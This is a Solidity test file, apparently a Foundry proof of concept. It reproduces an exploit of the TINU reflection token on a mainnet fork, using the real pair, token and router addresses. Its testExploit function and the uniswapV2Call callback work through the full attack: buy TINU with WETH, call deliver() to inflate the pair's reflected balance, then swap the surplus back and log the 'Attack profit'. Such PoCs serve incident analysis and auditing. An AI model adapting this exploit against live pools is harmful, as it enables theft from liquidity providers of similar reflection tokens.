// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

contract TINUAttacker is Test {
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IUniswapV2Pair tinu_weth = IUniswapV2Pair(0xb835752Feb00c278484c464b697e03b03C53E11B);
    IReflection tinu = IReflection(0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F);
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    IUniswapV2Router router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    
    function setUp() public {
        vm.createSelectFork("eth");
        
        vm.label(address(tinu_weth), "tinu-weth UniswapPair");
        vm.label(address(weth), "WETH");
        vm.label(address(tinu), "TINU");
    }

    function getMappingValue(address targetContract, uint256 mapSlot, address key) view public returns (uint256) {
        bytes32 slotValue = vm.load(targetContract, keccak256(abi.encode(key, mapSlot)));
        return uint256(slotValue);
    }
    
    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {
        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint amountInWithFee = amountIn * 997;
        uint numerator = amountInWithFee * reserveOut;
        uint denominator = (reserveIn *1000) + amountInWithFee;
        amountOut = numerator / denominator;
    }

    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) {
        require(amountOut > 0, 'UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint numerator = reserveIn * amountOut * 1000;
        uint denominator = (reserveOut-amountOut) * 997;
        amountIn = (numerator / denominator) + 1;
    }

    function testExcludePair() external {
        uint attackBlockNumber = 16489408;
        vm.rollFork(attackBlockNumber);
        console2.log("exclude pair?", tinu.isExcluded(address(tinu_weth)));
        // false
    }

    function testCondition() external {
        uint attackBlockNumber = 16489408;
        vm.rollFork(attackBlockNumber);

        uint256 rTotal = uint256(vm.load(address(tinu), bytes32(uint256(13))));
        uint256 rExcluded = getMappingValue(address(tinu), 3, address(0xC77aab3c6D7dAb46248F3CC3033C856171878BD5));
        uint256 tExcluded = getMappingValue(address(tinu), 4, address(0xC77aab3c6D7dAb46248F3CC3033C856171878BD5));
        uint256 rPair = getMappingValue(address(tinu), 3, address(tinu_weth));

        emit log_named_uint("TINU rTotal", rTotal);       // 108768187544805713501204846339732808402752408502014790599736522386140496654995
        emit log_named_uint("TINU rExcluded", rExcluded);  // 3192758909975747822405896956488198123659233150861213276289711491709459543580
        emit log_named_uint("TINU tExcluded", tExcluded);  // 0
        emit log_named_uint("Pair rOwned", rPair); // 108505905800335567462313514886909726810259466467478275604883839519551731249929
        console2.log("rPair > rSupply?", rPair > rTotal-rExcluded); // true

        emit log_named_uint("tPair", tinu.balanceOf(address(tinu_weth)));
        emit log_named_uint("tPair", tinu.tokenFromReflection(rPair));
    }

    function testExploit() external {
        uint attackBlockNumber = 16489408;
        vm.rollFork(attackBlockNumber);

        deal(address(weth), address(this), 2000 ether);

        uint256 rTotal = uint256(vm.load(address(tinu), bytes32(uint256(13))));
        uint256 rExcluded = getMappingValue(address(tinu), 3, address(0xC77aab3c6D7dAb46248F3CC3033C856171878BD5));
        uint256 rAmountOut = rTotal-rExcluded;
        uint256 tinuAmountOut = tinu.tokenFromReflection(rAmountOut) - 0.1*10**9;
        console2.log("tinuAmountOut:", tinuAmountOut);

        (uint reserve0, uint reserve1, ) = tinu_weth.getReserves();
        uint256 wethAmountIn = getAmountIn(tinuAmountOut, reserve1, reserve0);
        emit log_named_decimal_uint("WETH amountIn", wethAmountIn, weth.decimals());
        weth.transfer(address(tinu_weth), wethAmountIn);

        tinu_weth.swap(
            tinuAmountOut,
            0, 
            address(this),
            ""
        );
        emit log_named_uint("rReflect", getMappingValue(address(tinu), 3, address(this)));
        tinu.deliver(tinu.balanceOf(address(this)));
        emit log_named_uint("rTotal", uint256(vm.load(address(tinu), bytes32(uint256(13)))));
        emit log_named_uint("rPair", getMappingValue(address(tinu), 3, address(tinu_weth)));
        emit log_named_uint("tPair", tinu.balanceOf(address(tinu_weth)));

        (reserve0, reserve1, ) = tinu_weth.getReserves();
        emit log_named_uint("reserve0", reserve0);
        uint256 wethAmountOut = getAmountOut(tinu.balanceOf(address(tinu_weth))-reserve0, reserve0, reserve1);
        tinu_weth.swap(0, wethAmountOut, address(this), "");
        emit log_named_decimal_uint("Attack profit:", wethAmountOut - wethAmountIn, weth.decimals());
    }

    function testSwap() external {
        uint attackBlockNumber = 16489408;
        vm.rollFork(attackBlockNumber);
        uint256 rTotal = uint256(vm.load(address(tinu), bytes32(uint256(13))));
        uint256 rExcluded = getMappingValue(address(tinu), 3, address(0xC77aab3c6D7dAb46248F3CC3033C856171878BD5));
        uint256 tinuDeliver = tinu.tokenFromReflection(rTotal-rExcluded)-0.1*10**9;

        // uint256 amountOut = 1 ether;
        uint256 amountOut = 22144561460967547974;
        tinu_weth.swap(tinuDeliver, amountOut, address(this), "1");
        emit log_named_decimal_uint("WETH balance", weth.balanceOf(address(this)), weth.decimals());
    }

    function uniswapV2Call(address /*sender*/, uint /*amount0*/, uint /*amount1*/, bytes calldata /*data*/) external {
        tinu.deliver(tinu.balanceOf(address(this)));
        // (uint reserve0, uint reserve1, ) = tinu_weth.getReserves();
        // uint256 profit = getAmountOut(tinu.balanceOf(address(tinu_weth))-reserve0, reserve0, reserve1);
        // console2.log(profit);
        // 22144561460967547974
    }
    
}
